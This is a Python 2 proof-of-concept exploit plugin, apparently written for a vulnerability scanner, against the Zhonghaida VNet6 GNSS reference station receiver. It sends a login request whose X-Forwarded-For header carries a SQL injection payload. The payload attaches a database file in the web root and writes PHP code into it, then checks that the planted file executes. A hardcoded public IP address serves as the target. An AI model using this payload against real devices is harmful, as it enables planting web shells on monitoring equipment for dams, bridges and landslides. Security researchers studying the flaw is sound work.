#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import telnetlib

"""


该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。

POC Name  : 中海达VNet6专业型参考站接收机 多处SQL注入可getshell
Author    :  a
mail      :  a@lcx.cc

refer     :http://wooyun.org/bugs/wooyun-2015-0140314
"""

def assign(service, arg):
    if service == 'zhonghaida_vnet':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    raw = """POST /login.php HTTP/1.1
Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
Referer: http://120.202.60.143/
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; .NET CLR 1.1.4322)
Content-Length: 70
Host: 120.202.60.143
X-Forwarded-For: 120.202.60.143/',1,2,3,4,5,6);ATTACH DATABASE '/home/www/apache/htdocs/CSS/223.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php phpinfo();?>');--

usr=guest&psw=guest&action=1&lang=en&redirect=%2Fpages%2Fen%2Fuser.php
"""

    code, head,res, errcode, _ = curl.curl2(arg + 'login.php',raw=raw )
    code, head,res, errcode, _ = curl.curl2(arg + 'CSS/223.php')
    if code ==200 and  'phpinfo()' in res:
         security_hole(arg + 'CSS/223.php')


if __name__ == '__main__':
    from dummy import *
    audit(assign('zhonghaida_vnet', 'http://120.202.60.143/')[1])